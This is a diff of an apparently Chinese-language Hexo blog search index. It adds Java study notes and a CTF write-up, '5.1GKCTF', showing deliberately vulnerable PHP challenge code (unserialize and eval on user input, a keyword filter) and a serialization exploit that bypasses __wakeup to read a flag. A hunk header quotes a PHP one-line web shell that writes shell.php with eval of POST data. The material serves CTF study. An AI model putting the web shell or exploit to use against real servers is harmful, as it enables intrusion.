@@ -2316,9 +2316,15 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>对method实例调用invoke相当于调用此方法</p>
 <p>实例的本质是对象</p>
 <p>abstract类是没有花括号的类，不能被实例化</p>
+<p>321</p>
 <p>Dynamic Proxy</p>
 <p>在Java编程语言中，interface实例是指一个实现了某个接口的类的对象。接口是定义在类外的，不可以实例化</p>
 <p>可以定义抽象方法，是可以没有方法内容的</p>
+<p>类经过实例化才能调用非静态方法，</p>
+<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a><strong>泛型</strong></h3><p>使用泛型可以直接给一个类定义类型，不经过显式的强制转换</p>
+<p>通配符T，E，K，V</p>
+<p>?和T区别是？是一个不确定类，？和T都表示不确定的类型 ，但如果是T的话，函数里面可以对T进行操作，比方 T car &#x3D; getCar()，而不能用？ car &#x3D; getCar()。</p>
+<p>只能有一个public类，可以有多个public方法</p>
 ]]></content>
   </entry>
   <entry>
@@ -2351,6 +2357,27 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
     <title>做题笔记之DASCTF2022-BlogSystem</title>
     <url>/2023/04/17/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E4%B9%8BDASCTF2022-BlogSystem/</url>
     <content><![CDATA[<h1 id="FLASK伪造-目录穿越-PyYAML反序列化漏洞"><a href="#FLASK伪造-目录穿越-PyYAML反序列化漏洞" class="headerlink" title="FLASK伪造+目录穿越+PyYAML反序列化漏洞"></a>FLASK伪造+目录穿越+PyYAML反序列化漏洞</h1><p>上传文件时，PHP会在服务器上创建一个临时文件，用于暂时存储上传的文件内容，在文件上传完成后再将其移动到目标位置。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>5.1GKCTF</title>
+    <url>/2023/05/01/5-1GKCTF/</url>
+    <content><![CDATA[<p>1.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($string)&#123;</span><br><span class="line">    if(preg_match(&#x27;/f|l|a|g|\*|\?|dir|system|sed/i&#x27;, $string))&#123;</span><br><span class="line">        die(&quot;you are bad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class  A&#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public $f;</span><br><span class="line">    </span><br><span class="line">    public function shell($cmd)&#123;</span><br><span class="line">        $func=$this-&gt;f;</span><br><span class="line">      waf($cmd);</span><br><span class="line">        eval($func($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public  function __toString()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;shell($this-&gt;var);</span><br><span class="line">        return &#x27;1&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class  B&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $user;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $fun=$this-&gt;user;</span><br><span class="line">        $fun();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $vi;</span><br><span class="line">    public $vm;</span><br><span class="line">    public $ua;</span><br><span class="line">    public $ub;</span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        $this-&gt;vi-&gt;vm;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;ua-&gt;ghOst=&#x27;JAVA之神&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class D&#123;</span><br><span class="line">    public $va;</span><br><span class="line">    public $vb;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;va-&gt;vb();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>2.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;./flag.php&#x27;);</span><br><span class="line">class Sekai_Game&#123;</span><br><span class="line">    public $start ;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;b=$this-&gt;a;</span><br><span class="line">        if($this-&gt;start === &#x27;i_am_pop_god&#x27;)&#123;</span><br><span class="line">            echo &quot;Sekai Game Start Here is your flag &quot;.getenv(&#x27;FLAG&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;start=&#x27;nonono too yong too simple&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;sekai_game.run&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;sekai_game.run&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为了使$this-&gt;start赋值为i_am_pop_god，需要绕过__wakeup()方法</p>
+<p>通过引用绕过，：给$a&#x3D;&amp;$b,改变$b的时候就会改变$a，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sekai_Game&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hsez=new Sekai_Game();</span><br><span class="line">$hsez-&gt;a=&#x27;i_am_pop_god&#x27;;</span><br><span class="line">$hsez-&gt;start=&amp;$hsez-&gt;b;</span><br><span class="line">print_r(@serialize($hsez));</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
